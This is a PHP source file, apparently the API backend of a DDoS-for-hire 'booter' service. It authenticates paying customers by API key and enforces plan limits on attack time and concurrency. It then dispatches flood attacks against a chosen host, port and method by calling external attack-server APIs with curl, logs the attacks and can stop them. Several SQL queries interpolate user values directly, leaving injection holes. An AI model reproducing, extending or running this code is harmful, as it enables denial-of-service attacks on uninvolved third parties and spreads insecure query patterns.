<?php

header("X-XSS-Protection: 1; mode=block");

ob_start();
require_once 'unsec/vvvvv/veax.php';
require_once 'unsec/vvvvv/usoe.php';

$stmt = $odb->query("UPDATE logs SET stopped = 1 WHERE (`time` + `date`) < UNIX_TIMESTAMP() AND stopped = 0;");

// verifying our API Key
if(!empty($_GET["key"]))
{
    $username = '';
    $key = $_GET["key"];
    $stmt = $odb->prepare("SELECT apikey, username, ID FROM users WHERE apikey = :key");
    $stmt->bindParam(":key", $key);
    
    if($stmt->execute())
    {
        foreach($stmt->fetchAll() as $row)
        {
            if($row["apikey"] == $key)
            {
                $username = $row["username"];
                $_SESSION["ID"] = $row['ID'];
            }
            else
            {
                die(errorJson("Invalid API key"));
            }
        }
        
        if(empty($_SESSION["ID"]))
        {
            die(errorJson("Invalid API key"));
        }
        
    	$myMembership = $odb->prepare("SELECT membership FROM users WHERE username=:username");
    	$myMembership->bindParam(":username", $username, PDO::PARAM_STR);
    	if($myMembership->execute())
    	{
    	    if($myMembership->fetchColumn() == 1000152)
    	    {
    		    die(errorJson("No available Membership"));
            }
            else if (!($user->hasMembership($odb)) && $testboots == 0) {
    
    		    die(errorJson("No available Membership"));
    
    	    }
    	}
        
        if($username != '')
        {
            
                $host   = $_GET['host'];		
    			$port   = intval($_GET['port']);	
    			$time   = intval($_GET['time']);
    			$method = $_GET['method'];
    			$vip = $_GET['vip'];
    			
                //Verifying all fields
                if (empty($host) || empty($time) || empty($port) || empty($method) || !is_numeric($vip)) {
    				die(errorJson('Please verify all fields'));
    			}
    			else
    			{
    			    
    			    if(!($vip >= 0 && $vip <= 1))
    			    {
    			        die(errorJson("Unavailable VIP level"));
    			    }
	//Stop attack function



	                if ($method == "stop" || $method == "STOP"){

	    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE date >= UNIX_TIMESTAMP(DATE_SUB(NOW(), INTERVAL 1 DAY)) AND user='{$username}' AND stopped=0 ORDER BY `id` DESC LIMIT 10");

        while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
            $stop = $show['id'];
        }

		$SQLSelect = $odb -> query("SELECT * FROM `logs` WHERE `id` = '$stop'");



		while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {

			$host = $show['ip'];

			$port = $show['port'];

			$time = $show['time'];

			$method = $show['method'];

			$handler = $show['handler'];
		}



		$handlers = explode(",", $handler);

	

		foreach ($handlers as $handler){

			

			$SQLSelectAPI = $odb -> query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");

	

			while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {



				$APILink = $show['api'];



			}

			

			if(strpos($APILink, "mythicalstressapi.net"))

			{

        			$arrayFind = array('[host]','[port]','[time]', '[method]','[action]');

        			$arrayReplace = array($host, $port, $time, "STOP");

        		

        			$APILink = str_replace($arrayFind, $arrayReplace, $APILink);

        			$stopcommand  = "&action=STOP";

        			$stopapi = $APILink;

			}

			else

			{

    			$arrayFind = array('[host]','[port]','[time]','[method]');

    			$arrayReplace = array($host, $port, $time, 'STOP');

    		

    			$APILink = str_replace($arrayFind, $arrayReplace, $APILink);

    			$stopcommand  = "&method=stop";

    			$stopapi = $APILink;

			}

            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $APILink);

            curl_setopt($ch, CURLOPT_HEADER, 0);

            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);

			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

            curl_setopt($ch, CURLOPT_TIMEOUT, 120);

            $result = curl_exec($ch);
			
            $decoded = json_decode($result);
            
            if($decoded->status == "0")
            {
                die(errorJson($decoded->data));
            }
            
            if(!empty($decoded->error))
            {
                die(errorJson("$decoded->error"));
            }
            
            if($decoded->error == "yes")
            {
                die(errorJson("$decoded->data"));
            }
            

		}

		

		$SQL = $odb -> query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
               
                $SQL->bindParam(":stop", $stop, PDO::PARAM_INT);

        //die($stopapi);
		die(successJson("Succesfully stopped attack!"));

		

	}
                        
        		    else
        		    {
    		        		$stmt = $odb->query("SELECT unique_attacks FROM settings");
		                    $unique_attacks = $stmt->fetchColumn();
        		        
        		        
                			if($unique_attacks == 1)
                			{
                                $host_filter = parse_url($host, PHP_URL_HOST);
                
                                // Prepare and execute the SQL query
                                $stmt = $odb->prepare("SELECT COUNT(*) FROM logs WHERE ip LIKE :target AND stopped = 0");;
                                $target = "%$host_filter%";
                                $stmt->bindParam(":target", $target);
                                $stmt->execute();
                                
                                // Check if there are any rows with matching IP
                                if ($stmt->fetchColumn() > 0) {
                                    die(error("An Attack is already running on this Target 3"));
                                }
                                
                                // Prepare and execute the SQL query
                                $stmt = $odb->prepare("SELECT COUNT(*) FROM logs WHERE ip = :target AND stopped = 0");
                                $stmt->bindParam(":target", $host);
                                $stmt->execute();
                                
                                // Check if there are any rows with matching IP
                                if ($stmt->fetchColumn() > 0) {
                                    die(error("An Attack is already running on this Target 4"));
                                }
                			}
        		        
        		        
                			$SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
                			$SQL -> execute(array(':method' => $method));
                			$countMethod = $SQL -> fetchColumn(0);
                			
                			if ($countMethod == 0) {
	                			$SQL = $odb->prepare("SELECT name FROM `methods` WHERE `name` = :method");
                    			$SQL -> execute(array(':method' => $method));
                    			$method = $SQL -> fetchColumn(0);
                			}
                			
                			$SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
                			$SQL -> execute(array(':method' => $method));
                			$countMethod = $SQL -> fetchColumn(0);
                			
                			if($countMethod == 0)
                			{
                			    die(errorJson("Method is unavailable"));
                			}
                
                            
                            #die(errorJson($method));
                			if ($countMethod == 0) {
                    			$SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `fullname` = :method");
                    			$SQL -> execute(array(':method' => $method));
                    			$countMethod = $SQL -> fetchColumn(0);
                                if ($countMethod == 0) {
                                    die(errorJson('Method is unavailable'));   
                                }
                			}
                			
                			
                			$SQL = $odb->prepare("SELECT name FROM `methods` WHERE `fullname` = :method OR name = :method");
                			$SQL -> execute(array(':method' => $method));
                			$method = $SQL -> fetchColumn();
                			
    						if(strpos($method, "xxx") !== false)
                			{
                			    $xml = simplexml_load_file('https://xml.geoiplookup.io/'.$host);
                			    if(!strstr(strval($xml->asn_org), "xxx"))
                			    {
                			        die(errorJson('Target is not a OVH'));
                			    }
                			    else if($time >= 501)
                			    {
                			        die(errorJson('Boot Time is limited to 500 seconds for this attack!'));
                			    
                			    }
                			}
                
                			//Check if the host is a valid url or IP
                			$SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
                			$SQL -> execute(array(':method' => $method));
                			$type = $SQL -> fetchColumn(0);
                
                			if ($type == 'layer7' || $type == "layer7vip") {
                				//if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
                				//	die(errorJson('Host is not a valid URL'));
                				//}
                				//$host = preg_replace('#^https?://#', '', $host);
                				
                
                				$parameters = array("gov", "edu", "$", "{", "%", "<");
                
                				foreach ($parameters as $parameter) {
                					if (strpos($host, $parameter)) {
                						die('You are not allowed to attack these websites');
                					}
                				}
                
                			} elseif (!filter_var($host, FILTER_VALIDATE_IP)) {
                                die(errorJson('Host is not a valid IP address'));
                            }
                
                			//Check if host is blacklisted
                			$SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host");
                			$SQL -> execute(array(':host' => $host));
                			$countBlacklist = $SQL -> fetchColumn(0);
                
                			if ($countBlacklist > 0) {
                				die(errorJson('Host is blacklisted'));
                			}
                
                	} 
                    
            		    //Check concurrent attacks
                		if ($user->hasMembership($odb)) 
                		{
                			$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
                			$SQL -> execute(array(':username' => $username));
                			$countRunning = $SQL -> fetchColumn(0);
                			if ($countRunning >= $stats->concurrents($odb, $username)) {
                				die(errorJson('You have too many boots running.'));
                			}
            			}
        			
        			    //Check max boot time
                		$SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
                		$SQLGetTime->execute(array(':id' => $_SESSION['ID']));
                		$maxTime = $SQLGetTime->fetchColumn(0);
                
                		if (!$user->hasMembership($odb) && $testboots == 1) {
                			$maxTime = 60;
                		}
                
                		if ($time > $maxTime){
                			die(errorJson('Your max boot time has been exceeded.'));
                		}
                		
                		if($time < 1){
                			die(errorJson('Your attack must be over 0 seconds long'));
                		}
                
                		//Check open slots
                		if ($stats->runningBoots($odb) > $maxattacks && $maxattacks > 0) {
                			die(errorJson('No open slots for your attack'));
                		}
                
                        
                		
                		// check cooldown
                		
                		if ($cooldown == 1) {
                			die(errorJson('Cooldown in progress.. please wait!'));
                		}
                		
                		//Check if test boot has been launched
                		if(!$user->hasMembership($odb)){
                			$testattack = $odb->query("SELECT `testattack` FROM `users` WHERE `username` = '$username'")->fetchColumn(0);
                			if ($testboots == 1 && $testattack > 0) {
                				die(errorJson('You have already launched your test attack'));
                			}
                		}
                
                        //Check rotation
                        $i = 0;
                		
                		// Checks if the attack is VIP
                		if ($vip == '1') { 
                		    if($user->isVIP($odb))
                
                		    {
                
                    			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '1' AND `methods` LIKE :method ORDER BY RAND()");
                
                    			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
                
                		    }
                
                		    else
                
                		    {
                
                		        die(errorJson("You are not a VIP Member!"));
                
                		    }
                
                		} else { 
                
                			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '0' AND `methods` LIKE :method ORDER BY RAND()");
                
                            sleep(3);
                
                            if ($SQLSelectAPI->execute(array(':method' => "%$method%"))) {
                                // Fetch results before calling execute
                                while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
                                    
                            		if(empty($show))
                            		{
                            		    die(errorJson("No servers available"));
                            		}
                                    
                                    if ($rotation == 1 && $i > 0) {
                                        break;
                                    } 
                        
                                    $name = $show['name'];
                        			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
                        
                                    if ($count >= $show['slots']) {
                                        continue;
                                    }
                        
                                    $i++;
                                    $APILink = $show['api'];
        
                        			$arrayFind = array('[host]','[port]','[time]','[method]');
                        			$arrayReplace = array($host, $port, $time, $method);
                    
                        			$APILink = str_replace($arrayFind, $arrayReplace, $APILink);
                        			$handler[] = $show['name'];
                          
                        
                                    $APILink = str_replace($arrayFind, $arrayReplace, $APILink);
                        
                        			
                                    $ch = curl_init();
                        
                                    curl_setopt($ch, CURLOPT_URL, $APILink);
                        
                                    curl_setopt($ch, CURLOPT_HEADER, 0);
                        
                                    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
                        
                        			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        
                                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        
                                    curl_setopt($ch, CURLOPT_TIMEOUT, 120);
                        
                                    $result = curl_exec($ch);
                        
                                    curl_close($ch);
                                    
                                    $decoded = (array) json_decode($result, true);
                                    
                                    if (!$result) die(errorJson("No servers are available for this Attack! try again in few seconds"));
                                    
                                    //die($result);
                                    //die($APILink);
                                    if(!empty($decoded->error))
                                    {
                                        die(successJson("$decoded->error"));
                                    }
                                                
                                    if($result == "Error! No open slots for your attack")
                                    {
                                        die(errorJson("No open slots for your Attack!"));
                                    }
                                    
                                    if($result == "Your attack must be over 10 seconds long")
                                    {
                                        die(errorJson("Your attack must be over 10 seconds long!"));
                                    }
                                    
                                    if(strpos($result, "There is already one running attack on that IP!"))
                                    {
                                        die(errorJson("Allows only 1 attack per 1 ip"));
                                    }
                                    
                                    if($result == "You have too many boots running")
                                    {
                                        die(errorJson("No open slots for your Attack!"));
                                    }
                        
                            
                                    if ($i == 0) {
                                        die(errorJson('No open slots for your attack'));
                                    }
                        
                                }
                        
                        		//End of attacking servers script
                        		$handlers     = @implode(",", $handler);
                        
                            		//Insert Logs
                            		$chart = date("d-m");
                            		$insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :time, :method, '', '', '', '', UNIX_TIMESTAMP(), :chart, '0', :handler, '')");
                            		if($insertLogSQL -> execute(array(':user' => $username, ':ip' => $host, ':time' => $time, ':method' => $method, ':chart' => $chart, ':handler' => $handlers)))
                            		{
                            		    die(successJson("Attack sent successfully!"));
                            		}
                            		else
                            		{
                            		    die(print_r($insertLogSQL->errorInfo()));
                            		}
                                }
                            }
                
                		  }
    			}
            
        }
        else
        {
            die(errorJson("API key doesn't exist in our Database!"));
        }
}
else
{
    die(errorJson("API Key missing"));
}
?>